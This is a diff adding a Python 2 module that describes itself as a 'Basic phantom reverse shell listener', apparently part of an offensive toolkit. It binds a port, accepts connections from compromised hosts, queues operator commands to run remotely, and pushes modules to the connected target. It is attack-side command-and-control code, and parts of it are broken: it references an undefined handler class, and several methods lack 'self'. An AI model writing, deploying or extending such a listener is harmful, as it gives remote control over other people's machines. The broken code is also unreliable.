@@ -1,0 +1,471 @@
+#!/usr/bin/env python
+import socket
+import asyncore
+import signal
+import threading
+import time
+import imp
+import sys
+import shlex
+
+from twisted.internet.protocol import Factory, Protocol
+from twisted.internet.endpoints import TCP4ServerEndpoint
+from twisted.internet import reactor
+
+meta = {
+	'author':'Benjamin Donnelly',
+	'ported_by':"Benjamin Donnelly",
+	'version':'0.0.1',
+	'info':"Basic phantom reverse shell listener"
+}
+
+variables = {"host":["","no","Leave blank for default"], "port":["1226","yes","port to listen on"],"commands":["","yes","command(s) to execute remotely; sperate by semi-colon."]}
+
+CONNECTION_BOX = []
+
+command_list = []
+	
+
+
+class phantom_p(Protocol):
+	send_buffer = ""
+
+	#buffer_string = ''
+	#buffer_list = []	
+	#buffer_dict = {}
+
+	input_mode = "NOTraw"
+	coms_buf = ""
+
+	prompt_addition = ""
+	loaded_module = ""
+	loaded_module_variables = ""
+	
+	command_list = ""
+	not_copied = True
+
+	def writable(self):
+		return len(self.send_buffer) > 0
+
+	def readable(self):
+		return True
+
+	def parse_local(self, raw_com):
+		raw_com = str(raw_com).strip()
+		coms = []
+		#print raw_com
+		try:
+			coms = shlex.split(raw_com)
+		except:
+			return "LocalComLengthException"
+		
+		#list
+		if len(coms) == 2 and coms[0] == "list":
+			#variables
+			if coms[1] == "variables":
+				self._list_variables(self.loaded_module_variables)
+				return "list variables"
+		#load
+		if len(coms) == 2 and coms[0] == "load":
+			return "loaded module" + self._load(coms[1])
+		
+		#push
+		if len(coms) == 1 and coms[0] == "push":
+			temp = self._push(self.loaded_module) 
+			if temp != "exit()":
+				return "push " + temp
+			else:
+				print "No module loaded"
+				return	
+
+		#launch + DELIM
+		if len(coms) == 1  and "launch" == coms[0]:
+			temp = ""
+			try:
+				temp = self._launch()
+			except Exception as error:
+				print repr(error)			
+			
+			return "launch " + temp
+	
+		#ls
+		if len(coms) == 2 and coms[0] == "ls":
+			return "ls " + coms[1]
+
+		#touch
+		if len(coms) == 2 and coms[0] == "touch":
+			return "touch " + coms[1]
+	
+		#set <var>
+		if len(coms) == 3 and coms[0] == "set":
+			print "coms[1]:",coms[1],"coms[2]",coms[2]
+			self._set_variable(coms[1], coms[2])
+			return "set variable"
+
+		#exit
+		if len(coms) == 1 and coms[0] == "exit":
+			return "exit "
+
+		#debug
+		print len(coms)
+		if len(coms) > 0:
+			print coms[0]	
+		return "NoSuchLocalCommandException"
+
+	def commands_first(self):
+		command = self.command_list[0]
+		try:
+			self.command_list = self.command_list[1:]
+		except:
+			self.command_list = []
+		return self.parse_local(command)
+
+	#parses incoming phantom coms
+	#Don't forget to patch returns into buffer
+	def parse_com(self, raw_com):
+		if self.input_mode == "raw":
+			return self.parse_local(raw_input(">>> "))
+	
+		if len(command_list) > 0 and self.not_copied:
+			self.not_copied = False
+			self.command_list = command_list
+
+		raw_com = str(raw_com).strip().lower()
+		#safety checks on data here
+		coms = []
+		try:
+			coms = raw_com.split()
+		except:
+			return "DataLengthException"
+
+		#echo -- connection test
+		if len(coms) > 1 and coms[0] == "echo":
+			return self._echo(coms)
+		
+		
+		#add
+		if coms[0] == "add" and len(coms) > 2:
+			if 'dict' == coms[1]:
+				if len(coms) < 4:
+					return "TooFewItemsException"
+				return self._read('dict', raw_com)
+			elif (coms[1] == "string" or coms[1] == "list"):
+				return self._read(str(coms[1]), raw_com)
+			
+		#ready
+		if "readyforcommand" == coms[0]:
+			if len(self.command_list) == 0:
+				return self.parse_local("exit")	
+			else:
+				return self.commands_first()
+			#if len(self.coms_buf) > 0:
+			#	self.send_buffer = self.coms_buf
+			#	self.coms_buf = ""
+			#return
+
+		#print
+		if coms[0] == "print":
+			if "readyforcommand" in coms:
+				coms.remove("readyforcommand")
+			if "readyforcommandreadyforcommand" in coms:
+				coms.remove("readyforcommandreadyforcommand")
+			print " ".join(coms[1:])
+			return "Printed"
+
+		print coms[0]
+		return "NoSuchCommandException"
+
+
+	def required_set(self):
+		for var in self.loaded_module_variables:
+			if self.loaded_module_variables[var][1] == "yes":
+				if len(self.loaded_module_variables[var][0]) <= 0:
+					return False
+		return True
+
+	
+	#commands follow
+	
+
+	def _launch(self):
+		if len(self.loaded_module_variables) <= 0:
+			raise Exception("Error: Module not loaded")
+
+		if not self.required_set():
+			raise Exception("Error: Required not set")
+
+		return "DELIM " + str(self.loaded_module_variables) + " DELIM"
+
+	def _push(self, mod):
+		if mod is not None and len(mod) > 0:
+			return mod
+		return "exit()"
+
+	def _load(self, mod):
+		fi = open("../talos/phantom/modules/%s" %mod, "r")
+		data = fi.read()
+		fi.close()
+		
+		module = imp.load_source("*","../talos/phantom/modules/%s" % mod)
+		
+
+		self.loaded_module = data
+		self.prompt_addition = "PHANTOM::" + mod
+		self.loaded_module_variables = module.variables.copy()
+		return mod
+	
+	def _set_variable(self, var, value, required="no", description="Empty"):
+		if len(self.loaded_module_variables) < 1:
+			print "Looks like nothing is loaded"
+			return
+
+		if var in self.loaded_module_variables:
+			self.loaded_module_variables[var][0] = value
+
+		#for key in self.loaded_module_variables:
+		#	if var == key:
+		#		if len(self.loaded_module_variables[var]) == 3:
+		#			self.loaded_module_variables[var][0] == value
+		#		else:
+		#			self.loaded_module_variables[var] = [value, required, description]
+		#		return
+
+
+	def _list_variables(self, variables):
+		TOO_LONG = False
+	        LONG_ERR = "too long, to view type 'more <variable>'"
+	        name = 5
+	        value = 6
+	        required = 9
+	        desc = 0
+	        for v in variables:
+	                if len(variables[v]) == 3:
+	                        if len(v) > name:
+	                                name = len(v)
+	                        if len(variables[v][0]) > value:
+	                                value = len(variables[v][0])
+	                        if len(variables[v][2]) > desc:
+	                                desc = len(variables[v][2])
+		if desc > 50:
+	                TOO_LONG = True
+	                desc = len(LONG_ERR)
+	        total = 3 + name + value + required + desc
+
+	        print "Variables"
+	        sys.stdout.write("Name")
+	        for i in range(name - 3):
+	                sys.stdout.write(" ")
+	        sys.stdout.write("Value")
+	        for i in range(value - 4):
+	                sys.stdout.write(" ")
+	        sys.stdout.write("Required")
+	        sys.stdout.write("  ")
+	        sys.stdout.write("Description\n")
+	        for i in range(total):
+	                sys.stdout.write("-")
+	        print
+	
+		for variable in variables:
+                	if len(variables[variable]) == 3:
+                	        sys.stdout.write(variable)
+                	        for i in range(name - len(variable) + 1):
+                	                sys.stdout.write(" ")
+                	        sys.stdout.write(variables[variable][0])
+                	        for i in range(value - len(variables[variable][0]) + 1):
+                	                sys.stdout.write(" ")
+                	        sys.stdout.write(variables[variable][1])
+                	        for i in range(required - len(variables[variable][1]) + 1):
+                	                sys.stdout.write(" ")
+                	        if not len(variables[variable][2]) > 50:
+                	                print variables[variable][2]
+                	        else:
+                	                print LONG_ERR
+                	elif len(variables[variable]) == 1:
+                	        print variable, variables[variable]
+                	else:
+                	        print "variable %s is corrupt" % (variable)
+        	for i in range(total):
+                	sys.stdout.write("-")
+        	print
+	
+
+
+
+	def _echo(self, raw):
+		return " ".join(raw[1:])
+
+	def _read(self, ttype, raw):
+		if ttype == "string":
+			self.buffer_string += " ".join(raw.split()[2:])
+		if ttype == "list":
+			for word in raw.split()[2:]:
+				self.buffer_list.append(word)
+		if ttype == "dict":
+			try:
+				self.buffer_dict[str(raw.split()[2])]
+			except KeyError:
+				self.buffer_dict[str(raw.split()[2])] = str(raw.split()[3])
+		return "data added"	
+
+	def dataReceived(self, data):
+		for line in data.split("|||"):
+			self.transport.write(self.parse_com(line))
+
+	#handle incoming reads
+	def handle_read(self):
+		data = self.recv(1024)
+		if data:
+			print "RECV:: " + data
+			self.send_buffer = self.parse_com(data)
+
+	def print_buffers(self):
+		while True:
+			time.sleep(5)
+			print self.send_buffer
+
+	def handle_write(self):
+                if not "|||" in self.send_buffer:
+                        #sent = self.send(self.send_buffer)
+                        #print "Sending:: " + self.send_buffer, "::sent::", sent
+                        #self.send_buffer = self.send_buffer[sent:]
+			#if sent is None:
+			#	self.send_buffer = ""
+			self.sendall(self.send_buffer)
+			self.send_buffer = ""
+                else:
+                        for line in self.send_buffer.split("|||"):
+                                print "Sending: " + line
+                                self.sendall(line)
+                        self.send_buffer = ""
+		print "Send buffer: ", self.send_buffer
+
+
+class phantom_f(Factory):
+
+        protocol = phantom_p
+
+        def __init__(self):
+                self.buffer_string = ''
+                self.buffer_list = []
+                self.buffer_dict = {}
+
+
+def userIn(handler):
+	while True:
+		a = raw_input(">>> ")
+		handler.send_buffer = a
+
+def printOut(handler):
+	return 
+
+class userHandler:
+	
+	def __init__(self):
+		self.main_prompt = "Phantom Handler# "
+		self.conn_prompt = ">>> "
+		self.prompt = self.main_prompt
+		self.handler = ""
+
+	def sessionIsLoaded():
+		return not type(self.handler) == str
+
+	def userIn():
+		if self.sessionIsLoaded():
+			self.prompt = self.conn_prompt
+		else:
+			self.prompt = self.main_prompt
+
+		a = raw_input(self.prompt)
+		return a
+
+	def userHandler():
+		while True:
+			a = userIn()
+			self.parse_com(a)
+	
+	def listConections():
+		for i in range(len(CONNECTION_BOX)):
+			print i
+	
+	def connectTo(session_id):
+		try:
+			self.handler = CONNECTION_BOX[session_id]
+		except:
+			print "No such session"
+
+	def parse_com(a):
+		a = a.lower()
+		coms= a.split()
+
+		#If in session, pass through
+		if self.sessionIsLoaded():
+			handler.send_buffer = a
+			return
+		
+		#list connections
+		if len(coms) == 1 and coms[0] == "list":
+			self.listConnections()
+			return
+
+		#connect to
+		if len(coms) == 2 and coms[0] == "interact":
+			self.connectTo(coms[1])
+			return
+
+		#exit
+		if len(coms) == 1 and coms[0] == "exit":
+			signal.SIGINT
+			return
+
+		return
+		
+
+class phantom_s(asyncore.dispatcher):
+	host = ''
+	port = 1337
+
+	def __init__(self, host='', port=1337):
+		self.host = host
+		self.port = port
+		asyncore.dispatcher.__init__(self)
+		self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
+		self.set_reuse_addr()
+		self.bind((self.host, self.port))
+		self.listen(5)
+		
+	def handle_accept(self):
+		pair = self.accept()
+		if pair is not None:
+			sock, addr = pair
+			print 'Incoming connection from %s' % repr(addr)
+			handler = phantom_h(sock)
+			t = threading.Thread(target=handler.print_buffers)
+			t.daemon=True
+			t.start()
+			CONNECTION_BOX.append(handler)
+
+class commands:
+	def __init__(self):
+		return
+
+	@staticmethod
+	def run(variables, pt):
+		host = variables['host'][0]
+		port = int(variables['port'][0])
+
+		global command_list
+		try:
+			command_list = variables["commands"][0].split(";")
+		except:
+			command_list = []
+
+		print "Command List:", command_list
+
+		print "Press Ctrl + C to exit..."
+
+		endpoint = TCP4ServerEndpoint(reactor, port)
+		endpoint.listen(phantom_f())
+		reactor.run()
+
+		#server = phantom_s(host,port)
+		#asyncore.loop(map=self._thread_sockets, timeout=0.5)
